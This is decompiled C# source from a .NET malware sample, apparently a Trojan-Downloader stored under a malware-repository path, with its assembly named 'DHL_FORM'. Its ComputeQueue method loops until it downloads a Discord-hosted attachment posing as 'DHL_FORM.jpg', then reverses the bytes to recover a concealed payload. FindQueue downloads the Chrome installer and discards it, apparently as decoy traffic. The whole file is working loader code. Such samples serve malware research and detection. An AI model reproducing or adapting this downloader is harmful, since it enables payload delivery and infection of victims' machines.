// Decompiled with JetBrains decompiler
// Type: Xjsxb.Reponse
// Assembly: DHL_FORM, Version=98.0.4758.102, Culture=neutral, PublicKeyToken=null
// MVID: 25B51469-DD24-4213-BE46-0320E0AB194C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Downloader.MSIL.Wagex.gen-41289be9fbde5ede6e85978b73acff78532e6b5ce6af429fae337ffb708d5a08.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;

namespace Xjsxb
{
  internal class Reponse
  {
    [SpecialName]
    internal byte[] ComputeQueue()
    {
      try
      {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      }
      catch
      {
      }
      byte[] queue = (byte[]) null;
      this.FindQueue();
      while (queue == null)
      {
        try
        {
          byte[] collection = new BinaryReader(WebRequest.Create("https://cdn.discordapp.com/attachments/943730580221206558/947753392808296458/DHL_FORM.jpg").GetResponse().GetResponseStream()).ReadBytes(87776212);
          List<byte> byteList = new List<byte>();
          byteList.AddRange((IEnumerable<byte>) collection);
          byteList.Reverse();
          queue = byteList.ToArray();
        }
        catch
        {
          queue = (byte[]) null;
        }
      }
      return queue;
    }

    internal void FindQueue()
    {
      for (int index = 0; index < 2; ++index)
      {
        try
        {
          int num = 0;
          Stream stream = (Stream) null;
          MemoryStream memoryStream = (MemoryStream) null;
          WebResponse webResponse = (WebResponse) null;
          try
          {
            WebRequest webRequest = WebRequest.Create("https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BC90A50E2-9663-721F-0CA2-5F40A838AEA0%7D%26lang%3Den%26browser%3D4%26usagestats%3D0%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26installdataindex%3Dempty/chrome/install/ChromeStandaloneSetup64.exe");
            if (webRequest != null)
            {
              webResponse = webRequest.GetResponse();
              if (webResponse != null)
              {
                stream = webResponse.GetResponseStream();
                memoryStream = new MemoryStream();
                byte[] buffer = new byte[1024];
                int count;
                do
                {
                  count = stream.Read(buffer, 0, buffer.Length);
                  memoryStream.Write(buffer, 0, count);
                  num += count;
                }
                while (count > 0);
              }
            }
          }
          catch (Exception ex)
          {
            Console.WriteLine(ex.Message);
          }
          finally
          {
            webResponse?.Close();
            stream?.Close();
            memoryStream?.Close();
            GC.Collect();
          }
        }
        catch
        {
        }
      }
      GC.Collect();
    }
  }
}
